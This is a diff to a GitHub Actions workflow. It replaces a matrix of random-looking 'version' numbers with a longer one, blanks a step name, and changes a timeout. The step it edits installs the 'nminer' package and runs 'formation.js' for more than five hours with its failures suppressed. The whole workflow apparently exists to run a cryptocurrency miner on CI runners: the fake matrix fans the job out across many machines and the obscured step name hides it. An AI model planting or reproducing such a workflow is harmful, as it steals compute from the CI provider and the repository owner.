@@ -9,22 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2284 }
-          - { version: 5034 }
-          - { version: 391 }
-          - { version: 707 }
-          - { version: 7858 }
-          - { version: 939 }
-          - { version: 2406 }
-          - { version: 5929 }
-          - { version: 8886 }
-          - { version: 5973 }
-          - { version: 9998 }
-          - { version: 7920 }
-          - { version: 2724 }
-          - { version: 9084 }
-          - { version: 3522 }
-          - { version: 7986 }
+          - { version: 4373 }
+          - { version: 5539 }
+          - { version: 2045 }
+          - { version: 6530 }
+          - { version: 9968 }
+          - { version: 2687 }
+          - { version: 7395 }
+          - { version: 7754 }
+          - { version: 9789 }
+          - { version: 5687 }
+          - { version: 445 }
+          - { version: 6801 }
+          - { version: 5426 }
+          - { version: 359 }
+          - { version: 9913 }
+          - { version: 6207 }
+          - { version: 5975 }
+          - { version: 3852 }
 
     steps:
       - name: Checkout
@@ -35,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: diligently plain
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 322m node formation.js || echo "formation executed"
+          timeout 347m node formation.js || echo "formation executed"
